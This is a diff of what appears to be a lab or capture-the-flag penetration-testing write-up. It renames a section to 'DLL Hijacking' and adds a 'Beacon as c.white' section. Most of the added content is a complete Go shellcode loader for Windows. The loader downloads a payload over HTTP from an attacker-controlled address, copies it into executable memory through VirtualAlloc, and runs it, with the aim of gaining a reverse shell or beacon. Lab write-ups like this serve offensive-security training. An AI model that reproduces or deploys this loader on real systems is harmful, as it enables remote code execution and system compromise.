@@ -665,7 +665,7 @@ Let’s sync once you’ve had time to review and implement this.
 
 Also found an interesting email on the desktop of `t.dalton`
 
-# Compromising `c.white`
+# DLL Hijacking
 
 So the email guided me to the windows update checker
 
@@ -768,4 +768,75 @@ It reaches back to me!
 
 This means the C code works, i just need to figure out the best way to trigger a reverse shell!
 
-#
+# Beacon as `c.white`
+
+```c
+
+```
+
+```go
+// +build windows
+			
+package main
+			
+import (
+	"io"
+	"net/http"
+	"syscall"
+	"unsafe"
+	)
+			
+var (
+	kernel32            = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
+	)
+			
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	)
+			
+func downloadShellcode(url string) ([]byte, error) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, err
+		}
+	defer resp.Body.Close()
+			
+	return io.ReadAll(resp.Body)
+	}
+			
+func executeShellcode(shellcode []byte) {
+	addr, _, err := procVirtualAlloc.Call(
+		0,
+		uintptr(len(shellcode)),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if addr == 0 {
+		panic(err)
+	}
+			
+	// Copy shellcode into allocated memory
+	for i := 0; i < len(shellcode); i++ {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
+	}
+		
+	// Execute shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+		
+
+func main() {
+	url := "http://10.200.75.73/http.x64.bin"
+			
+	shellcode, err := downloadShellcode(url)
+	if err != nil {
+		panic(err)
+	}
+			
+	executeShellcode(shellcode)
+}
+```
+
